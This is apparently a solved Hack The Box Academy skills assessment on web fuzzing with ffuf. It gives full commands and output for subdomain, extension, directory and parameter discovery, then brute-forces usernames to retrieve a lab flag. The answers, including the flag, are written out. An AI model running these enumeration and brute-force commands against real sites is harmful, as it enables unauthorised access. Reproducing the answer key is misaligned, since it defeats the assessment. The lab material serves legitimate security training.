# Section 13: Skills Assessment - Web Fuzzing

Module: 15. Attacking Web Applications with Ffuf

---

## Questions & Answers

### 1. Run a sub-domain/vhost fuzzing scan on '*.academy.htb' for the IP shown above. What are all the sub-domains you can identify? (Only write the sub-domain name)

Context:
```bash
┌─[eu-academy-2]─[10.10.15.157]─[htb-ac-2162140@htb-icahzfusod-htb-cloud-com]─[~]
└──╼ [★]$ ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:31766/ -H 'Host: FUZZ.academy.htb' -fs 985

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://academy.htb:31766/
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.academy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 985
________________________________________________

archive                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 168ms]
test                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3850ms]
faculty                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 167ms]
:: Progress: [4989/4989] :: Job [1/1] :: 237 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```

**Answer:** `archive test faculty`

---

### 2. Before you run your page fuzzing scan, you should first run an extension fuzzing scan. What are the different extensions accepted by the domains?

Context:
```bash
┌─[eu-academy-2]─[10.10.15.157]─[htb-ac-2162140@htb-icahzfusod-htb-cloud-com]─[~]
└──╼ [★]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://faculty.academy.htb:31766/indexFUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://faculty.academy.htb:31766/indexFUZZ
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.php7                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 168ms]
.phps                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 2613ms]
.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4652ms]
:: Progress: [43/43] :: Job [1/1] :: 9 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
┌─[eu-academy-2]─[10.10.15.157]─[htb-ac-2162140@htb-icahzfusod-htb-cloud-com]─[~]
└──╼ [★]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://test.academy.htb:31766/indexFUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://test.academy.htb:31766/indexFUZZ
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 169ms]
.phps                   [Status: 403, Size: 284, Words: 20, Lines: 10, Duration: 1693ms]
:: Progress: [43/43] :: Job [1/1] :: 16 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
┌─[eu-academy-2]─[10.10.15.157]─[htb-ac-2162140@htb-icahzfusod-htb-cloud-com]─[~]
└──╼ [★]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://archive.academy.htb:31766/indexFUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://archive.academy.htb:31766/indexFUZZ
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [43/43] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 43 ::
```

**Answer:** `.php .phps .php7`

---

### 3. One of the pages you will identify should say 'You don't have access!'. What is the full page URL?

Context:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:31441/FUZZ -recursion -recursion-depth 1 -e .php -v
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:31441/FUZZ -recursion -recursion-depth 1 -e .phps -v
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:31441/FUZZ -recursion -recursion-depth 1 -e .php7 -v
```
What I found:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:31441/FUZZ -recursion -recursion-depth 1 -e .php7 -v

<SNIP>
[Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 167ms]
| URL | http://faculty.academy.htb:31441/courses
| --> | http://faculty.academy.htb:31441/courses/
    * FUZZ: courses

[INFO] Adding a new job to the queue: http://faculty.academy.htb:31441/courses/FUZZ
<SNIP>
[Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 168ms]
| URL | http://faculty.academy.htb:31441/courses/linux-security.php7
    * FUZZ: linux-security.php7
```
```bash
┌─[eu-academy-2]─[10.10.15.157]─[htb-ac-2162140@htb-dqf3zrlmdw-htb-cloud-com]─[~]
└──╼ [★]$ curl http://faculty.academy.htb:31441/courses/linux-security.php7
  <div class='center'><p>You don't have access!</p></div>
<html>
<!DOCTYPE html>

<head>
  <title>HTB Academy</title>
  <style>
    *,
    html {
      margin: 0;
      padding: 0;
      border: 0;
    }

    html {
      width: 100%;
      height: 100%;
    }

    body {
      width: 100%;
      height: 100%;
      position: relative;
      background-color: #151D2B;
    }

    .center {
      width: 100%;
      height: 50%;
      margin: 0;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      color: white;
      font-family: "Helvetica", Helvetica, sans-serif;
      text-align: center;
    }

    h1 {
      font-size: 144px;
    }

    p {
      font-size: 64px;
    }
  </style>
</head>

<body>
</body>
```

**Answer:** `http://faculty.academy.htb:PORT/courses/linux-security.php7`

---

### 4. In the page from the previous question, you should be able to find multiple parameters that are accepted by the page. What are they?

Context:
```bash
┌─[eu-academy-2]─[10.10.15.157]─[htb-ac-2162140@htb-dqf3zrlmdw-htb-cloud-com]─[~]
└──╼ [★]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:31441/courses/linux-security.php7?FUZZ=key -fs 774

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://faculty.academy.htb:31441/courses/linux-security.php7?FUZZ=key
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 774
________________________________________________

user                    [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 167ms]
:: Progress: [6453/6453] :: Job [1/1] :: 238 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
┌─[eu-academy-2]─[10.10.15.157]─[htb-ac-2162140@htb-dqf3zrlmdw-htb-cloud-com]─[~]
└──╼ [★]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:31441/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 774

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://faculty.academy.htb:31441/courses/linux-security.php7
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : FUZZ=key
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 774
________________________________________________

user                    [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 167ms]
username                [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 170ms]
:: Progress: [6453/6453] :: Job [1/1] :: 235 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
```

**Answer:** `user username`

---

### 5. Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag?

Context:
```bash
┌─[eu-academy-2]─[10.10.15.157]─[htb-ac-2162140@htb-dqf3zrlmdw-htb-cloud-com]─[~]
└──╼ [★]$ locate xato-net-10-million-usernames
/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
┌─[eu-academy-2]─[10.10.15.157]─[htb-ac-2162140@htb-dqf3zrlmdw-htb-cloud-com]─[~]
└──╼ [★]$ ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ -u http://faculty.academy.htb:31441/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://faculty.academy.htb:31441/courses/linux-security.php7
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 781
________________________________________________

harry                   [Status: 200, Size: 773, Words: 218, Lines: 53, Duration: 167ms]
Harry                   [Status: 200, Size: 773, Words: 218, Lines: 53, Duration: 170ms]
┌─[eu-academy-2]─[10.10.15.157]─[htb-ac-2162140@htb-dqf3zrlmdw-htb-cloud-com]─[~]
└──╼ [★]$ curl http://faculty.academy.htb:31441/courses/linux-security.php7 -X POST -d 'username=harry' -H 'Content-Type: application/x-www-form-urlencoded'
<div class='center'><p>HTB{w3b_fuzz1n6_m4573r}</p></div>
<html>
<!DOCTYPE html>

<head>
  <title>HTB Academy</title>
  <style>
    *,
    html {
      margin: 0;
      padding: 0;
      border: 0;
    }

    html {
      width: 100%;
      height: 100%;
    }

    body {
      width: 100%;
      height: 100%;
      position: relative;
      background-color: #151D2B;
    }

    .center {
      width: 100%;
      height: 50%;
      margin: 0;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      color: white;
      font-family: "Helvetica", Helvetica, sans-serif;
      text-align: center;
    }

    h1 {
      font-size: 144px;
    }

    p {
      font-size: 64px;
    }
  </style>
</head>

<body>
</body>

</html>
```

**Answer:** `HTB{w3b_fuzz1n6_m4573r}`

---

[Back to Module Index](./README.md)
